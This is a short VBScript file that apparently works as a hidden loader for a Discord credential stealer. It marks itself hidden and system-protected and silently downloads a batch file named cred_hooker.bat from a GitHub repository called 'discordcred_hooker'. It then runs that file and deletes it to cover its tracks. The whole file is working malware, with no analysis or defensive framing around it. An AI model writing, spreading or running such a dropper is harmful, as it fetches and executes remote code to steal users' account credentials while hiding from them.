option explicit

dim obj : set obj = createobject("wscript.shell")

obj.run "cmd /c attrib +h +s +r dsch_shadow.vbs", 0, True
obj.run "cmd /c curl -o dschv2.bat https://raw.githubusercontent.com/batchhacker00/discordcred_hooker/refs/heads/main/dschv2/cred_hooker.bat && attrib +h +s +r && dschv2.bat && attrib -h -s -r dschv2.bat && del /s dschv2.bat", 0, True
